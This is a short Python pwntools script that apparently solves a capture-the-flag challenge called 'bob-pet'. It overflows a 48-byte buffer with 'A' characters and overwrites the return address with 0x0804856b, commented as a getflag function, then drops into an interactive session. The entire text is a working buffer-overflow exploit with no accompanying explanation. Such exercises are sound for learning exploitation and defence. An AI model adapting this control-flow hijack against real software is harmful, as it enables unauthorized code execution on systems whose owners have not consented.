from pwn import *
import os

#0x0804856b = address of getflag function
s = process('./bob-pet')
temp = 'A'*48
temp += p32(0x0804856b)

s.recvuntil('Bob pet Name: ')
s.sendline(temp)
print "found"
s.interactive()
